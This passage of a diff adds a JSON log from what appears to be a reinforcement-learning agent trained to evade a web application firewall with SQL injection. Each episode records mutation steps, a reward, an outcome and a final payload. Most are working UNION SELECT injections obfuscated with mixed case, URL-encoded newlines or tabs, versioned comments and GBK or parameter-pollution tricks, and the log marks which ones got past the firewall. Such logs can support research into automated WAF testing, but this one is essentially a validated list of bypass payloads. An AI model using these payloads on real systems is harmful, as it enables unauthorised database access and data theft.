+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 69,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 70,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 71,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 72,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "case_split",
+      "paren_space",
+      "comment",
+      "ver_12345",
+      "comment",
+      "between_space",
+      "comment",
+      "tab_space",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "case",
+      "comment",
+      "tab_space"
+    ],
+    "final_payload": "0'/**/UnIoN(SeLECt/**/(1),(2),('3))"
+  },
+  {
+    "episode": 73,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "ver_urlenc",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "url_encode",
+      "comment",
+      "newline",
+      "newline",
+      "comment",
+      "double_and",
+      "comment",
+      "newline",
+      "newline",
+      "tab_space"
+    ],
+    "final_payload": "0'%0a/*!50000%55NION*/%0a/*!50000%53ELECT*/%0a1,2,'3"
+  },
+  {
+    "episode": 74,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 75,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 76,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 77,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 78,
+    "steps": 3,
+    "total_reward": 5.52,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "double_or",
+      "tab_space"
+    ],
+    "final_payload": "0'%09uNiOn%09sElEcT%091,2,'3"
+  },
+  {
+    "episode": 79,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 80,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 81,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 82,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 83,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 84,
+    "steps": 15,
+    "total_reward": -24.6,
+    "success": false,
+    "final_result": "SQL_ERROR",
+    "sequence": [
+      "double_encode",
+      "newline",
+      "comment",
+      "vtab",
+      "comment",
+      "formfeed",
+      "comment",
+      "vtab",
+      "comment",
+      "case_split",
+      "newline",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf"
+    ],
+    "final_payload": "0'%2520uNion%2520sElEcT%25201,2,'3"
+  },
+  {
+    "episode": 85,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "vtab",
+      "comment",
+      "newline",
+      "backtick",
+      "comment",
+      "scientific",
+      "keyword_split",
+      "comment",
+      "comment",
+      "comment",
+      "keyword_split",
+      "comment",
+      "comment",
+      "newline",
+      "comment"
+    ],
+    "final_payload": "0'%0b`UN/**/ION`%0b`SEL/**/ECT`%0b1,2,'3"
+  },
+  {
+    "episode": 86,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 87,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 88,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 89,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 90,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 91,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "url_encode",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "formfeed",
+      "comment",
+      "tab_space",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf",
+      "comment",
+      "tab_space",
+      "comment"
+    ],
+    "final_payload": "0'/**/%55NION/**/%53ELECT/**/1,2,'3"
+  },
+  {
+    "episode": 92,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 93,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 94,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 95,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 96,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 97,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 98,
+    "steps": 15,
+    "total_reward": -7.1,
+    "success": false,
+    "final_result": "SQL_ERROR",
+    "sequence": [
+      "case_split",
+      "dbl_url_comment",
+      "between_space",
+      "comment",
+      "comment",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf",
+      "double_encode",
+      "comment",
+      "newline",
+      "newline",
+      "tab_space",
+      "comment"
+    ],
+    "final_payload": "0'%a0UnIoN%a0SeLeCt%a01,2,'3"
+  },
+  {
+    "episode": 99,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 100,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "ver_urlenc",
+      "tab_space",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "case",
+      "vtab",
+      "vtab",
+      "comment",
+      "newline",
+      "comment",
+      "between_space",
+      "comment"
+    ],
+    "final_payload": "0'%09/*!50001%55NION*/%09/*!50001%53ELECT*/%091,2,'3"
+  },
+  {
+    "episode": 101,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "hex_encode",
+      "newline",
+      "comment",
+      "newline",
+      "comment",
+      "tab_space",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment"
+    ],
+    "final_payload": "0'%0aUNION%0aSELECT%0a0x31,0x32,'3"
+  },
+  {
+    "episode": 102,
+    "steps": 3,
+    "total_reward": 5.52,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "case",
+      "formfeed"
+    ],
+    "final_payload": "0'%0cunIon%0csEleCt%0c1,2,'3"
+  },
+  {
+    "episode": 103,
+    "steps": 3,
+    "total_reward": 5.52,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "hex_encode",
+      "tab_space"
+    ],
+    "final_payload": "0'%09UnIoN%09SELEcT%090x31,0x32,'3"
+  },
+  {
+    "episode": 104,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 105,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "param_pollute",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "double_encode",
+      "comment",
+      "comment",
+      "newline",
+      "ver_urlenc",
+      "formfeed",
+      "comment"
+    ],
+    "final_payload": "0'%0a/*!50001%55NION*//*&q=*//*!50001%53ELECT*//*&q=*/1,2,'3"
+  },
+  {
+    "episode": 106,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "plus_sep",
+      "newline",
+      "newline",
+      "newline",
+      "tab_space",
+      "comment",
+      "formfeed",
+      "newline",
+      "newline",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf",
+      "comment",
+      "vtab"
+    ],
+    "final_payload": "0'+UNION+SELECT+1,2,'3"
+  },
+  {
+    "episode": 107,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 108,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 109,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "case_split",
+      "scientific",
+      "ver_newline",
+      "comment",
+      "double_encode",
+      "comment",
+      "vtab",
+      "newline",
+      "tab_space",
+      "newline",
+      "newline",
+      "tab_space",
+      "comment",
+      "plus_sep",
+      "case_split"
+    ],
+    "final_payload": "0'/**/uNion/**/sElEcT/**/1e0,2e0,'3"
+  },
+  {
+    "episode": 110,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 111,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 112,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 113,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 114,
+    "steps": 15,
+    "total_reward": -7.1,
+    "success": false,
+    "final_result": "SQL_ERROR",
+    "sequence": [
+      "case_split",
+      "dbl_url_comment",
+      "between_space",
+      "formfeed",
+      "comment",
+      "comment",
+      "vtab",
+      "comment",
+      "formfeed",
+      "comment",
+      "tab_space",
+      "ver_00000",
+      "comment",
+      "tab_space",
+      "ver_50000"
+    ],
+    "final_payload": "0'%a0uNion%a0selECT%a01,2,'3"
+  },
+  {
+    "episode": 115,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 116,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 117,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 118,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 119,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 120,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "ver_50000",
+      "newline",
+      "newline",
+      "crlf",
+      "comment",
+      "case",
+      "comment",
+      "hex_encode",
+      "comment",
+      "between_space",
+      "comment",
+      "crlf",
+      "comment",
+      "newline",
+      "newline"
+    ],
+    "final_payload": "0'%0a/*!40100UnIOn*/%0a/*!40100sELecT*/%0a1,2,'3"
+  },
+  {
+    "episode": 121,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 122,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 123,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "comment",
+      "case",
+      "comment",
+      "case",
+      "newline",
+      "comment",
+      "formfeed",
+      "newline",
+      "crlf",
+      "param_pollute",
+      "comment",
+      "tab_space",
+      "formfeed",
+      "comment",
+      "comment"
+    ],
+    "final_payload": "0'/**/unIOn/*&q=*/sElEcT/*&q=*/1,2,'3"
+  },
+  {
+    "episode": 124,
+    "steps": 3,
+    "total_reward": 5.52,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "nested_or",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 125,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 126,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 127,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 128,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 129,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 130,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 131,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 132,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "tab_space"
+    ],
+    "final_payload": "0'%09UNIoN%09SeLeCt%091,2,'3"
+  },
+  {
+    "episode": 133,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 134,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 135,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "gbk_bypass",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "newline",
+      "comment",
+      "double_and"
+    ],
+    "final_payload": "0%bf%27%0aUNION%0aSELECT%0a1,2,%bf%273"
+  },
+  {
+    "episode": 136,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "case_split",
+      "double_and",
+      "case_split",
+      "comment",
+      "case_split",
+      "comment",
+      "between_space",
+      "comment",
+      "plus_sep",
+      "comment",
+      "plus_sep",
+      "newline",
+      "case",
+      "comment",
+      "case_split"
+    ],
+    "final_payload": "0'/**/uNion/**/seLect/**/1,2,'3"
+  },
+  {
+    "episode": 137,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 138,
+    "steps": 15,
+    "total_reward": -4.6,
+    "success": false,
+    "final_result": "SQL_ERROR",
+    "sequence": [
+      "case_split",
+      "between_space",
+      "nested_or",
+      "comment",
+      "comment",
+      "comment",
+      "between_space",
+      "comment",
+      "plus_sep",
+      "newline",
+      "comment",
+      "crlf",
+      "comment",
+      "ver_newline",
+      "comment"
+    ],
+    "final_payload": "0'%a0uNIon%a0SeLeCt%a01,2,'3"
+  },
+  {
+    "episode": 139,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 140,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 141,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 142,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 143,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 144,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "paren_full",
+      "newline",
+      "url_encode",
+      "comment",
+      "comment",
+      "hex_encode",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "case",
+      "comment",
+      "tab_space",
+      "nested_or",
+      "comment"
+    ],
+    "final_payload": "0'%0a%55NION(%53ELECT%0a(1),(2),('3))"
+  },
+  {
+    "episode": 145,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 146,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 147,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "newline",
+      "crlf",
+      "newline",
+      "newline",
+      "tab_space",
+      "newline",
+      "newline",
+      "tab_space",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf",
+      "url_encode",
+      "comment",
+      "crlf"
+    ],
+    "final_payload": "0'%0a%55NION%0a%53ELECT%0a1,2,'3"
+  },
+  {
+    "episode": 148,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 149,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "paren_space",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "between_space",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "comment"
+    ],
+    "final_payload": "0'%0aUNION(SELECT%0a(1),(2),('3))"
+  },
+  {
+    "episode": 150,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 151,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "char_split",
+      "case",
+      "formfeed",
+      "comment",
+      "case_split",
+      "comment",
+      "crlf",
+      "comment",
+      "vtab",
+      "comment",
+      "tab_space",
+      "comment",
+      "vtab",
+      "comment",
+      "formfeed"
+    ],
+    "final_payload": "0'%0c/*U*//*N*//*I*//*O*//*N*/%0c/*S*//*E*//*L*//*E*//*C*//*T*/%0c1,2,'3"
+  },
+  {
+    "episode": 152,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 153,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 154,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 155,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 156,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 157,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 158,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 159,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 160,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "newline",
+      "vtab",
+      "comment",
+      "crlf",
+      "comment",
+      "vtab",
+      "comment",
+      "crlf",
+      "comment",
+      "vtab",
+      "comment",
+      "formfeed",
+      "newline",
+      "concat_char",
+      "comment"
+    ],
+    "final_payload": "0'%0aUNION%0aSELECT%0a1,2,'3"
+  },
+  {
+    "episode": 161,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 162,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 163,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 164,
+    "steps": 2,
+    "total_reward": 7.76,
